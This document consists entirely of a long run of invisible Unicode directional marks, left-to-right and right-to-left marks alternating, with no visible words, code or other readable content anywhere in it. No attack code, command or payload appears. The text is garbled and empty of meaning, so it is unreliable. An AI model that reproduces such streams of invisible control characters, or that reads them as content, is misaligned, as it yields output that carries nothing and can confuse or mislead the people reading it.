‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎